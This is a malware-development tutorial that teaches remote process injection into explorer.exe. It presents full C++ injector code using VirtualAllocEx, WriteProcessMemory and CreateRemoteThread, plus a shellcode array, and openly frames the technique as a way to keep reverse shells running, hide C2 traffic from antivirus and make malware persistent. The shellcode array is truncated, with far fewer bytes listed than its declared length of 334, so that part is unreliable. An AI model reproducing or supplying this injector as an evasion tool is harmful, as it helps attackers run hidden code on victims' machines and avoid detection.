# Process Code Injection

## Introduction

Welcome to this article. Today, I will demonstrate how to inject a process into another running process on the same machine. For this example, we will inject into the `explorer.exe` process. I hope you find this tutorial informative.

### Why Use Process Code Injection?

- **Extended Lifespan of Payloads:** When using a basic reverse shell, the connection only stays alive while the original executable is running. If the user closes the program, the shell dies. However, by injecting your reverse shell into a legitimate process like explorer.exe, the payload keeps running—even after the original executable is closed—since the injected code now lives inside a different, trusted process.

- **Blending with Legitimate Activity:** If your malware connects directly to a C2 server, it’s easy for antivirus software to flag it as suspicious—especially if the connection comes from an unknown or unsigned executable. Process injection allows you to move your operations into a trusted process like chrome.exe or any web browser, making your network traffic appear more legitimate and harder to detect.

- **Achieving Persistence:** You can enhance persistence by injecting your code into multiple remote processes. Even if one process is terminated, your malicious payload can continue to operate from other injected processes, increasing the resilience of your malware.


![image](https://github.com/user-attachments/assets/4b1f3922-efcc-407c-9f7d-65bbff258601)

## Code :

```C++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payload[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
};
unsigned int payload_len = 334;

int FindPID(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


int main(void) {
    
 int pid = 0;
    HANDLE hProc = NULL;

 pid = FindPID("explorer.exe");

 if (pid) {
  printf("Explorer.exe PID = %d\n", pid);

  // try to open target process
  hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
      PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
      FALSE, (DWORD) pid);

  if (hProc != NULL) {
   Inject(hProc, payload, payload_len);
   CloseHandle(hProc);
  }
 }
 return 0;
}
```

The code consists of three primary functions, each with a specific role:

- **FindPID:** This function basically receives the name of one process, and return the PID (Process ID) from this process, to do this use `CreateToolhelp32Snapshot` to see all the current processes, and with `Process32First` and `Process32Next`, captures the PID from the previous and next processes executed in victim machine.

- **Inject:** This function inject your shellcode to one process, to do this is very simple uses 3 other functions :\
  1. `VirtualAllocEx`, here is creating little memory space in remote process to after inject code.\
  2. `WriteProcessMemory` with this it’s moving the malicious shellcode to provious memory space created with `VirtualAllocEx`.\
  3. The last one is `CreateRemoteThread` this is to execute the memory location with your malicious code inside.

- **Main:** This function basically are executing the last 2, and controlling errors from other 2 functions.


## POC : 

Now let's execute the code : 

![image](https://github.com/user-attachments/assets/ed01f018-bf77-4c57-82e2-787de92ba1a8)

The popped screen RTO: MalDev displays my shellcode, and it’s working well. However, it only functions if `explorer.exe` is open; otherwise, it doesn’t work. Now, it's time to check if the shellcode has truly been injected into the `explorer.exe` process.

To verify this, I use the Process Hacker. You can download it from the following link :

> Download - Process Hacker\
Process Hacker, A free, powerful, multi-purpose tool that helps you monitor system resources, debug software and detect. [here](https://systeminformer.sourceforge.io/downloads)

Let’s go to explorer threads.

![image](https://github.com/user-attachments/assets/f6d1a4f3-e444-4a83-a8b5-7ad4c3d0b37c)

Both processes have a PID of 756. Now, go to the Threads section where you should see your malicious thread. To identify it, right-click on `explorer.exe` → select Threads, and then search for `ntdll.dll!RtlUserThreadStart`.

`UserThreatStart` is the key string you need to look for in order to identify your malicious thread.

![image](https://github.com/user-attachments/assets/b8fc0b05-667f-49bd-a9aa-d1dc8b822965)

![image](https://github.com/user-attachments/assets/c78538c9-19da-47a4-8e65-d413de62e4c6)

In the malicious thread stack, you should see MessageBox, which corresponds to a Windows MessageBox. This is what it looks like:

![image](https://github.com/user-attachments/assets/3b319658-a949-4f90-b27d-cbbacbd5c987)


## Conclusions

This article has covered one of the simplest forms of code injection into a remote process. While this technique serves as a foundation, more advanced methods will be explored in future content.

Thanks for reading! :smiley:

**-Malforge Group.**
